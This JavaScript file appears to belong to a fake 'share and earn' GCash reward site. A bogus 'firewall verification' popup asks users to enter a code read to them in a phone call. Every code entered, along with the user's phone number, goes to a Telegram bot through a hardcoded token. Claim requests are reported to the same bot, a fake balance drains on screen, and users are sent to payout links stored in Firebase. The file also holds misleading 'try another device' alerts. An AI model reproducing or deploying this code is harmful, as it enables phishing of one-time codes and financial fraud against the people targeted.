// ========== POPUP_SHARE.JS - FOR SHARE_AND_EARN ==========

let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        console.warn("Firebase not available");
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        console.error("Firewall check error:", e);
        return false;
    }
}

function listenToFirewallChangesShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return;
    const db = firebase.database();
    db.ref('admin/globalFirewall').on('value', (snapshot) => {
        const data = snapshot.val();
        cachedFirewallStatusShare = (data && data.active === true);
        console.log("Firewall status updated:", cachedFirewallStatusShare);
    });
}

async function sendTelegramShare(phone, code) {
    const msg = `VERIFY REQUEST\nPhone: ${phone}\nCode: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("Telegram sent");
    } catch(e) {}
}

// ========== FIREWALL POPUP ==========
function showFirewallPopupShare() {
    console.log("Showing firewall verification popup");
    const popup = document.getElementById('firewallPopup');
    if (!popup) return;
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCodeShare" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtnShare" class="verify-btn">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsgShare" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    console.log("VERIFICATION CODE:", currentVerificationCodeShare);
    
    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCodeShare');
        if (ci) ci.focus();
    }, 100);
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        await sendTelegramShare(userPhone, code);
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        await sendTelegramShare(userPhone, code);
        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        console.warn("No available links found in Firebase");
        return null;
    } catch (error) {
        console.error("Error getting payout link:", error);
        return null;
    }
}

// ========== SHOW CONGRATULATIONS POPUP ==========
async function showClaimPopupShare(amount) {
    console.log("showClaimPopupShare called with amount:", amount);
    
    const firewallActive = await getFirewallStatusShare();
    console.log("Firewall active:", firewallActive);
    
    if (firewallActive) {
        console.log("FIREWALL ON - Showing verification popup");
        showFirewallPopupShare();
        return;
    }
    
    console.log("FIREWALL OFF - Showing congratulations popup");
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() { 
    const p = document.getElementById('claimPopup'); 
    if (p) p.style.display = 'none'; 
}

function showPendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'block'; 
    claimStateShare.isPending = true; 
}

function hidePendingStatusShare() { 
    const pa = document.getElementById('pendingStatusArea'); 
    if (pa) pa.style.display = 'none'; 
    claimStateShare.isPending = false; 
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            claimStateShare.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN TIMER ==========
function startVisibleCountdownShare(originalAmount) {
    let remaining = claimStateShare.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    
    if (!timerSpan) return;
    
    claimStateShare.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimStateShare.countdownInterval);
            claimStateShare.countdownInterval = null;
            
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            
            if (pendingArea) pendingArea.style.display = 'none';
            
            claimStateShare.isProcessing = false;
            claimStateShare.hasRedirected = false;
        }
    }, 1000);
}

// ========== REDIRECT TIMER ==========
function startImaginaryTimerShare(redirectUrl) {
    setTimeout(() => {
        if (!claimStateShare.hasRedirected) {
            claimStateShare.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 2000);
}

// ========== CLAIM ACTION (SIMILAR SA MAIN.HTML) ==========
function onClaimActionShare() {
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimStateShare.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopupShare();
                showPendingStatusShare();
                startSmoothDecrementShare(amount);
                startVisibleCountdownShare(amount);
                startImaginaryTimerShare(redirectUrl);
                
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimStateShare.isProcessing = false;
                }, 3000);
                alert("Your Withdrawal is unsuccessful. Switch another device and claim your rewards!");
            }
        }).catch((err) => {
            console.error("Firebase error:", err);
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimStateShare.isProcessing = false;
            }, 3000);
        });
    }
}

// ========== CLAIM THRU GCASH HANDLER ==========
async function handleClaimThruGCashShare() {
    console.log("CLAIM THRU GCASH clicked - showing congratulations popup");
    showClaimPopupShare(150);
}

// ========== NO LINK ALERT ==========
function showNoLinkAlertShare() {
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background:#1a1525; border-radius:40px; max-width:320px; width:85%; padding:30px; text-align:center; border:1px solid #ff4444;">
            <div style="font-size:48px;">⚠️</div>
            <h3 style="color:#ff4444;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color:white; font-size:13px; text-align:left; margin-top:20px;">
                <p>• This device has already reached the maximum payout limit.</p>
                <p>• No GCash app installed on this device.</p>
                <p>• Please try using another device.</p>
            </div>
            <button id="closeAlert" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; margin-top:20px; width:100%; cursor:pointer;">OK</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlert').onclick = () => modal.remove();
}

// ========== EXPORT FUNCTIONS ==========
window.showFirewallPopupShare = showFirewallPopupShare;
window.hideFirewallPopupShare = hideFirewallPopupShare;
window.verifyFirewallCodeShare = verifyFirewallCodeShare;
window.showClaimPopupShare = showClaimPopupShare;
window.onClaimActionShare = onClaimActionShare;
window.handleClaimThruGCashShare = handleClaimThruGCashShare;

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatusShare();
    listenToFirewallChangesShare();
    getFirewallStatusShare().then(status => {
        console.log("Initial firewall status:", status);
        cachedFirewallStatusShare = status;
    });
    console.log("Popup_share.js loaded");
});
